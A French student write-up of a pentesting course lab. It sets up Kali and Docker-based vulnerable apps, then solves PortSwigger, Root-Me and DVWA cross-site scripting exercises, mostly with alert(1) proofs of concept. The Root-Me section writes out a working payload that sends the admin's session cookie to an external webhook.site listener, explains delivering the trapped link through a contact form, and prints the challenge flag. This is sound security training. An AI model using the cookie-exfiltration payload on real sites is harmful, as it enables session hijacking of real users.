# Challenge C501 16/03/2026

## 🧑‍🏫 Pitch de l’exercice

Le challenge du jour consiste à :

- Mettre en place un lab de PenTest (Kali Linux + DVWA),
- Découvrir de Burp Suite (proxy HTTP),
- Créer votre compte sur la [plateforme de CTF Root-Me](https://www.root-me.org/?lang=fr),
- Réaliser les [3 premiers challenges XSS Portswigger](https://portswigger.net/web-security/all-labs#cross-site-scripting),
- Réaliser le challenge XSS-DOM-Based-Introduction.
- Réaliser les 3 exploitations de XSS Sur [DVWA](http://10.0.0.20:4280/).

[Cours C501.](/RESUME.md#-c501-introduction-au-pentesting--faille-xss)

> 📚 **Ressources** :
>
> - Kali Docs : <https://www.kali.org/docs/>
> - Burp Suite : <https://www.it-connect.fr/tuto-burpsuite-proxy-web-local/>

---

## Déploiement VM Kali Linux (Pentest Ready)

**Objectif :** Disposer d'une machine d'audit de sécurité isolée et performante dans le réseau `10.0.0.0/24`.

### 1. Configuration Proxmox (Hardware)

- **Options :** Activer "**QEMU Guest Agent**"
- **Processeur :** 2-4 vCPUs (Type : **host**)
- **Mémoire :** 4 Go (4096 MiB)
- **Réseau :** Bridge `vmbr2` (LAN Isolé derrière pfSense)
- **Disque :** 50 Go (Bus : VirtIO / **Discard** : On / **SSD Emulation** : On)

### 2. Post-Installation

Une fois l'installation terminée, on doit préparer le système pour qu'il soit opérationnel et sécurisé.

```bash
# MISE À JOUR DU SYSTÈME
sudo apt update && sudo apt upgrade -y

# CONFIGURATION RÉSEAU & ACCÈS SSH
# Configuration de l'interface Ethernet en statique
auto eth0
iface eth0 inet static
    address 10.0.0.30/24
    gateway 10.0.0.1
    dns-nameservers 10.0.0.1 9.9.9.9

sudo systemctl restart networking
ip a

# Activer SSH pour l'administration distante
sudo apt install openssh-server -y
sudo systemctl enable --now ssh

(se connecter en SSH)

# OPTIMISATION PROXMOX
sudo apt install qemu-guest-agent -y
sudo systemctl enable --now qemu-guest-agent

# BUREAU A DISTANCE
sudo apt install xrdp -y
sudo systemctl enable --now xrdp

```

**Optimisation XFCE pour le RDP :**

- Aller dans Paramètres > Peaufinage des fenêtres (ou Window Manager Tweaks en anglais).
- Aller dans le dernier onglet : Compositeur (ou Compositor).
- Décocher la case : Activer le compositeur d'affichage (Enable display compositing).

---

## Déploiement DVWA via Docker

**Objectif :** Fournir un environnement d'entraînement légal et cloisonné pour pratiquer l'identification, l'exploitation et la remédiation des vulnérabilités web critiques (OWASP Top 10). Il permet de monter en compétences sur des techniques d'attaque réelles sans risquer d'endommager des systèmes de production.

**Pré-requis :** Avoir installé Docker et le plugin Compose sur la machine cible (`sudo apt install docker.io docker-compose-v2 -y`).

### 1. Récupération et Configuration

On récupère les sources et on prépare le fichier de déploiement.

```bash
# Récupération du dépôt
git clone https://github.com/digininja/DVWA.git
cd DVWA/

# Création/Édition du fichier compose.yml
nano compose.yml

```

### 2. Contenu du fichier `compose.yml`

Voici une configuration propre pour un réseau `10.0.0.0/24`. On mappe le port **4280** pour l'accès web.

```yaml
services:
  dvwa:
    image: vulnerables/web-dvwa
    ports:
      - "4280:80"
    restart: always

```

### 3. Lancement du service

```bash
# Lancement en arrière-plan
docker compose up -d

# Vérification que le conteneur tourne
docker ps
```

![docker](/images/2026-03-16-12-41-43.png)

### 3. Premier accès et Configuration

- **URL d'accès :** `http://10.0.0.30:4280/login.php`
- **Identifiants par défaut :** `admin` / `admin`.
- **Initialisation :** Une fois connecté, il faut impérativement cliquer sur le bouton **"Create / Reset Database"** en bas de page pour générer les tables MySQL.
- **Identifiants :** `admin` / `password`.
- **Sécurité :** Pour débuter tes tests d'intrusion (Pentest), aller dans l'onglet **"DVWA Security"** et règler le niveau sur **"Low"**.

![DVWA](/images/2026-03-16-12-08-55.png)

---

## Déploiement Symfony & VulnerableSymfony

### 1. Qu'est-ce que Symfony ?

**Symfony** est un **framework PHP** professionnel (créé en France) utilisé pour bâtir des applications web robustes et évolutives.

- **Standard Industriel** : Il motorise des plateformes comme BlaBlaCar ou Spotify, et sert de base à des outils comme Drupal.
- **Structure MVC** : Il sépare les données (Modèle), l'affichage (Vue) et la logique (Contrôleur) pour un code propre et sécurisé.
- **Composants** : Il est composé de briques logicielles réutilisables que l'on retrouve dans de nombreux autres projets PHP.

### 2. Objectif : VulnerableSymfony

C'est un "laboratoire" sous forme d'application Symfony réelle, mais contenant volontairement des failles de sécurité.

- **Réalisme** : Contrairement à DVWA (très simple), ce projet simule une application d'entreprise moderne.
- **Challenge** : On y apprend à exploiter des vulnérabilités spécifiques aux frameworks (mauvaises configurations, failles dans les composants tiers).

> Intended Vulnerable Symfony : <https://github.com/Secureaks/VulnerableSymfony>

### 3. Déploiement Docker

On l'installe dans la zone LAN isolée (`vmbr2`) pour isoler les flux.

```bash
# 1. Récupération du lab
git clone https://github.com/Secureaks/VulnerableSymfony.git
cd VulnerableSymfony

# 2. Construction de l'image (Build)
# Cette étape assemble l'environnement Symfony/PHP/Apache
docker build -t vulnerable-symfony .

# 3. Lancement du conteneur
# On mappe le port 8000 pour éviter les conflits avec DVWA
docker run -d --name symfony-lab -p 8000:80 vulnerable-symfony

```

- **Accès Web** : `http://10.0.0.30:8000`

> Direct via docker hub : <https://hub.docker.com/r/secureaks/vulnerablesymfony>

---

## Portswigger XSS Labs

![Portswigger](/images/2026-03-16-17-29-39.png)

Les XSS challenges sur Portswigger : <https://portswigger.net/web-security/all-labs#cross-site-scripting>

### Lab: Reflected XSS into HTML context with nothing encoded

*This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.*

*To solve the lab, perform a cross-site scripting attack that calls the alert function.*

La commande `<script>alert(1)</script>` entraîne bien **alert(1)** sur la page, proof of concept d'avoir trouvé la faille.

![alert](/images/2026-03-16-17-37-04.png)

**Explication :**

Le navigateur a lu la page de haut en bas, a vu la balise `<script>`, a cru que c'était une instruction officielle du développeur, et l'a exécutée.

### Lab: Stored XSS into HTML context with nothing encoded

*This lab contains a stored cross-site scripting vulnerability in the comment functionality.*

*To solve this lab, submit a comment that calls the alert function when the blog post is viewed.*

Remplir le formulaire de commentaire avec `<script>alert(1)</script>` et le reste

![comment](/images/2026-03-16-17-43-17.png)

Au retour sur le blog l'alerte pop bien **alert(1)**

**Explication :**

Le serveur a sauvegardé le commentaire avec le script dans sa base de données. Maintenant, tous les utilisateurs qui visitent cet article vont télécharger le commentaire. Leurs navigateurs vont lire la balise `<script>` et faire popper l'alerte chez eux. C'est redoutable.

### Lab: DOM XSS in document.write sink using source location.search

*This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.*

*To solve this lab, perform a cross-site scripting attack that calls the alert function.*

![DOM](/images/2026-03-16-18-00-40.png)

Remplir le formulaire de commentaire avec `"><svg onload=alert(1)>`, renvois bien **alert(1)**

**Explication :**

Le texte est inséré à l'intérieur d'une balise existante, ici une image, si on tapait juste `<script>`, ça ne marchait pas.

---

## Root Me : XSS DOM-based Lab

<https://www.root-me.org/fr/Challenges/Web-Client/XSS-DOM-Based-Introduction>

**Contexte :** Le but du challenge est de récupérer le cookie de session de l'administrateur en exploitant une vulnérabilité XSS de type DOM (Document Object Model).

### Étape 1 : Analyse et Proof of Concept (PoC)

- **Observer le comportement :** Il faut d'abord interagir normalement avec l'application. En soumettant une valeur (ex: `42`), on remarque que cette dernière est directement reflétée dans l'URL en tant que paramètre (`?number=42`). <http://challenge01.root-me.org/web-client/ch32/?number=42>

- **Inspecter le code source (F12) :** Il est nécessaire de rechercher comment ce paramètre est traité. Dans le code JavaScript de la page, on trouve la ligne suivante :
`var number = '42';`
La valeur de l'URL est directement injectée entre des guillemets simples, sans aucun filtrage.

![script](/images/2026-03-16-18-40-09.png)

- **Forger l'évasion (PoC) :** Pour prouver que l'on peut exécuter du code, il faut "casser" cette ligne de code en injectant la payload suivante à la place du chiffre `42` dans l'URL :

```sh
42'; alert(1); //
```

- `'` permet de fermer prématurément la variable du développeur.
- `;` termine l'instruction JavaScript.
- `alert(1)` est le code injecté pour tester l'exécution.
- `//` permet de commenter le reste de la ligne d'origine pour éviter une erreur de syntaxe qui bloquerait le script.

L'URL <http://challenge01.root-me.org/web-client/ch32/?number=42%27;%20alert(1);%20//> ou l'injection `42'; alert(1); //` dans la boite nous renvois bien une **alert(1)**

### Étape 2 : Préparation de l'exfiltration

- Faire apparaître une alerte locale n'est pas suffisant pour voler une information. Il faut exfiltrer le cookie vers un serveur externe.
- **Créer un serveur d'écoute :** Il est recommandé d'utiliser un service gratuit comme `Webhook.site` pour générer une URL de réception unique.
- **Créer le script malveillant :** Il faut remplacer la fonction `alert(1)` par une instruction qui redirigera la victime vers le serveur d'écoute en passant son cookie en paramètre :
`document.location='https://webhook.site/628ac341-f1a1-4864-b71b-2c0f0eecf882/?c='+document.cookie`
- **Générer l'URL piégée finale :**

```sh
http://challenge01.root-me.org/web-client/ch32/?number=42';document.location='https://webhook.site/628ac341-f1a1-4864-b71b-2c0f0eecf882/?c='%2Bdocument.cookie;//
```

### Étape 3 : Exploitation via le vecteur d'attaque

- **Trouver le point de contact :** Il faut repérer un moyen de faire visiter cette URL à l'administrateur. Le lien "Contact" présent sur la page d'accueil sert de vecteur.
- **Envoyer le piège :** Il suffit de soumettre l'URL piégée complète dans le formulaire de contact.

![contact](/images/2026-03-16-19-03-07.png)

- **Récupérer le flag :** Le robot (simulant l'administrateur) va cliquer sur le lien. Son navigateur va interpréter le JavaScript modifié et envoyer automatiquement son cookie de session vers le serveur `Webhook.site`. Il ne reste plus qu'à consulter les logs du Webhook pour récupérer le "flag" et valider le challenge.

![flag](/images/2026-03-16-19-03-52.png)

🏁 `c=flag=rootme{XSS_D0M_BaSed_InTr0}`

![Validation](/images/2026-03-16-19-11-13.png)

---

## Damn Vulnerable Web Application : XSS

### L'attaque Reflected XSS (Le miroir)

<http://10.0.0.20:4280/vulnerabilities/xss_r/>

Payload :

```sh
<script>alert("Coucou Reflected !");</script>
```

![reflected](/images/2026-03-16-19-27-00.png)

![alert](/images/2026-03-16-19-27-10.png)

### L'attaque Stored XSS (Le script persistant)

<http://10.0.0.20:4280/vulnerabilities/xss_s/>

Payload :

```sh
<script>alert("Coucou Stored !");</script>
```

![stored](/images/2026-03-16-19-30-58.png)

![alert](/images/2026-03-16-19-31-12.png)

L'alert pop bien, et quand on sort puis reviens sur la page XXS (Stored), l'erreur est persistante !

### L'attaque DOM-based XSS (Le ninja local)

<http://10.0.0.20:4280/vulnerabilities/xss_d>

En choisissant une langue elle apparaît dans l'URL :

<http://10.0.0.20:4280/vulnerabilities/xss_d/?default=German>

Payload :

```sh
?default=<script>alert("Coucou DOM !");</script>
```

URL : <http://10.0.0.20:4280/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(%22Coucou%20DOM%20!%22);%3C/script%3E>

![alert](/images/2026-03-16-19-36-18.png)
